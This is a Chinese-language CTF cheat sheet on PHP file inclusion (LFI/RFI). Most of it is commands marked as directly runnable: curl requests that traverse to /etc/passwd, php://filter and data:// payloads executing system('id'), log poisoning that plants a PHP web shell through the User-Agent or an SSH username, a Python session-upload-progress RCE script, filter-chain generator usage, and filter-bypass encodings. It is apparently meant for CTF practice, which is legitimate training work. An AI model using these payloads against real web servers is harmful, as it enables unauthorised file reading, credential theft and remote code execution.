---
title: 文件包含 LFI/RFI（php://filter / 日志包含）
category: web
tags: [lfi, rfi, php filter, 日志包含, 文件包含]
signals: [include 参数, file 参数, page 参数, path 参数, 包含文件, php://filter, 目录遍历, ../, 403 只能读文件, 日志文件]
difficulty: medium
source: "PayloadsAllTheThings / CTF-Wiki / HackTricks"
tools: [curl, python, php_filter_chain_generator]
updated: 2026-10-22
---

## 一、识别信号（题面长什么样）

- 参数名是 `file`、`page`、`lang`、`tpl`、`path`、`include`，值形如 `index.php`。
- `?page=../../../../etc/passwd` 能读出内容 → LFI。
- `?lang=php://filter/convert.base64-encode/resource=index.php` 能读源码。
- `?url=http://...` 被 include → RFI（需 `allow_url_include=On`）。
- 有文件上传 / 访问日志 → 日志包含。
- 关键词：include、require、LFI、RFI、php://filter。

## 二、原理

`include($_GET['page'])` 把参数当文件路径，未过滤 `../` 即可穿越目录读任意文件。类型：

| 类型 | 说明 | 利用 |
|---|---|---|
| LFI | 本地文件包含 | 读 `/etc/passwd`、读源码、包含上传文件 |
| 源码读取 | `php://filter` | `convert.base64-encode` 防止被当 PHP 执行 |
| 日志包含 | 包含 access log | UA 里写 PHP 代码 → 日志被执行 |
| 临时文件 | 包含 `phpXXXXXX` | 配合文件上传 |
| RFI | 远程包含 | `allow_url_include=On` 时代码直接执行 |
| session | 包含 session 文件 | `session.upload_progress` 控制 session 内容 |

## 三、解题步骤

1. 确认 LFI：`?file=../../../../etc/passwd`。
2. 读源码：`php://filter/convert.base64-encode/resource=index.php`。
3. 读不到源码时试 `php://filter/read=convert.base64-encode|convert.base64-encode/resource=...`。
4. 要执行代码：日志包含 / 临时文件包含 / `php://filter` chain 生成器（纯文件包含 RCE）。
5. 拿到 flag。

## 四、可直接运行的脚本

基础读取：

```bash
# 目录穿越
curl "http://TARGET/?file=../../../../etc/passwd"
curl "http://TARGET/?file=/etc/passwd"                  # 绝对路径直接给
curl "http://TARGET/?file=....//....//etc/passwd"        # 过滤了 ../ 的绕过

# 读源码（base64 防解析）
curl "http://TARGET/?file=php://filter/convert.base64-encode/resource=index.php"

# 双重 base64（过滤了 convert.base64-encode 时）
curl "http://TARGET/?file=php://filter/read=convert.base64-encode|convert.base64-encode/resource=config.php"

# 读其它协议
curl "http://TARGET/?file=php://filter/resource=/etc/passwd"
curl "http://TARGET/?file=data://text/plain,<?php system('id');?>"
curl "http://TARGET/?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+"
```

日志包含（Apache / Nginx access log）：

```bash
# 1. 先让日志里出现 PHP 代码（写进 UA）
curl -s "http://TARGET/" -H "User-Agent: <?php system(\$_GET['c']); ?>"

# 2. 包含日志文件
curl "http://TARGET/?file=/var/log/apache2/access.log&c=cat%20/flag"
curl "http://TARGET/?file=/var/log/nginx/access.log&c=id"
curl "http://TARGET/?file=/var/log/httpd/access_log&c=id"
# 容器里常见
curl "http://TARGET/?file=/proc/self/fd/1"
```

SSH 日志（含 `<?php ?>` 会被记录）：

```bash
ssh '<?php system($_GET["c"]); ?>'@TARGET
# 然后包含 /var/log/auth.log
```

Session 文件包含（`session.upload_progress`）：

```python
import requests

url = "http://TARGET/index.php"
# 1. 利用 upload_progress 控制 session 内容
requests.post(url, data={"PHP_SESSION_UPLOAD_PROGRESS": "<?php system($_GET['c']); ?>"},
              files={"file": ("a.txt", "test")}, cookies={"PHPSESSID": "attacker"})
# 2. 包含 session 文件
r = requests.get(url, params={"file": "/var/lib/php/sessions/sess_attacker", "c": "id"},
                 cookies={"PHPSESSID": "attacker"})
print(r.text)
```

`php://filter` chain 生成 RCE（PHP 8 / 无日志写权限时）：

```bash
# 用工具生成一串 filter 链，把任意 PHP 代码"编译"进 base64 字符流
git clone https://github.com/synacktiv/php_filter_chain_generator
python3 php_filter_chain_generator.py --chain '<?php system("id");?>'
# 输出一长串：php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|...
# 直接拼进 ?file= 即可
```

Nginx 日志在容器内也可用 `/proc/self/fd/2`：

```bash
curl "http://TARGET/?file=/proc/self/fd/2"     # 有时是 stderr
```

## 五、常见坑 / 变体

- **`../` 被过滤**：`....//`、`..././`、URL 编码 `%2e%2e%2f`、双重编码 `%252e%252e%252f`。
- **`php://` 被过滤**（`php` 关键词）：`php://` 是固定的，可用 `PHP://`/大小写或 `phar://`；也可用 `convert.base64-encode` 的简写 `read=`。
- **读源码时页面被解析**：`php://filter` 只对 PHP 文件有效，`.php` 会被执行导致 0 字节输出，必须 base64。
- **包含路径被加 `.php` 后缀**：`?file=../etc/passwd%00`（PHP < 5.3.4）或用 `/etc/passwd/.` 之类；现代版本可用 `php://filter` 绕过后缀拼接（`resource=` 后加 `/..`）。
- **`allow_url_include=Off`**：RFI 不行，只能 LFI 打。
- **`open_basedir` 限制**：读不到 `/etc/passwd`，但可读 Web 目录内的文件。
- 变体：**phar:// 包含**（见 `phar-deserialization.md`）。
- 变体：**`/proc/self/cmdline`、`/proc/self/environ`** 读容器环境变量拿 flag。

## 六、参考来源

- [PayloadsAllTheThings - File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- [CTF-Wiki Web 简介 / 文件包含](https://ctf-wiki.org/web/introduction/)
- [HackTricks - File Inclusion](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html)
- [php_filter_chain_generator（synacktiv）](https://github.com/synacktiv/php_filter_chain_generator)
- [OWASP WSTG - Testing for Local File Inclusion](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)
